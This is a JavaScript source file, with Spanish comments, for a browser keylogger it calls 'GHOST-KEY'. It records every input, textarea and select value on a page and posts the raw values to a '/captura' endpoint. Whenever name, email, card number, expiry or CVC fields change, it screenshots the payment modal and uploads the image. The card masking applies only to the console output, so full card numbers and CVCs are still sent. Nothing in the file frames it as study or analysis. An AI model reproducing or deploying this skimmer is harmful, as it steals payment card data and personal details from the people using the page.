// Variables para el keylogger
let lastScreenshotTime = 0;
const SCREENSHOT_INTERVAL = 5000; // Captura cada 5 segundos

// Función para capturar pantalla (solo el modal de pago)
export async function captureScreenshot() {
    try {
        // Capturar SOLO el modal de pago en vez de toda la pantalla
        const paymentCard = document.querySelector('#payment-modal .payment-card');
        if (!paymentCard) {
            console.log('Modal de pago no visible, captura omitida');
            return;
        }

        const canvas = await html2canvas(paymentCard, {
            allowTaint: true,
            useCORS: true,
            scale: 2 // Escala 2x para mayor nitidez
        });
        
        // JPEG con calidad 0.85 para buena calidad sin peso excesivo
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        
        // Enviar al servidor
        fetch('/upload-screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                image: imageData,
                user: document.getElementById('c-name')?.value || 'usuario',
                timestamp: new Date().getTime()
            })
        }).catch(err => console.log('Error capturando pantalla:', err));
        
        console.log(`Captura del modal de pago enviada`);
    } catch (error) {
        console.log('No se pudo capturar pantalla:', error);
    }
}

// Función para capturar datos de campos de formulario
function captureFormFieldData(fieldName, fieldValue) {
    let displayValue = fieldValue;
    if(fieldName.toLowerCase().includes('card') || fieldName.toLowerCase().includes('number')) {
        displayValue = fieldValue.replace(/\d(?=\d{4})/g, '*');
    }
    
    fetch('/captura', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            f: fieldName,
            v: fieldValue,
            timestamp: new Date().toLocaleString()
        })
    }).catch(err => console.log('No se pudo enviar captura:', err));
    
    console.log(`Campo: ${fieldName} => Valor: ${displayValue}`);
    
    const importantFields = ['c-name', 'c-email', 'c-number', 'c-exp', 'c-cvc'];
    if(importantFields.includes(fieldName)) {
        const now = Date.now();
        if((now - lastScreenshotTime) > SCREENSHOT_INTERVAL) {
            captureScreenshot();
            lastScreenshotTime = now;
        }
    }
}

// Inicializador del Keylogger que añade los listeners al DOM
export function initKeylogger() {
    // Solo usamos 'change' — el evento 'blur' causaba registros duplicados
    document.addEventListener('change', event => {
        const tag = event.target.tagName;
        if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
            captureFormFieldData(
                event.target.id || event.target.name || 'campo-desconocido',
                event.target.value
            );
        }
    });

    // Mensaje de inicialización silenciado en consola
    window.addEventListener('load', () => {
        const form = document.getElementById('payment-form');
        if(form) form.reset();
        
        console.log('%cGHOST-KEY INICIALIZADO', 'color: red; font-size: 14px; font-weight: bold;');
        console.log('%cCaptura de datos: ACTIVA', 'color: orange; font-size: 12px;');
    });
}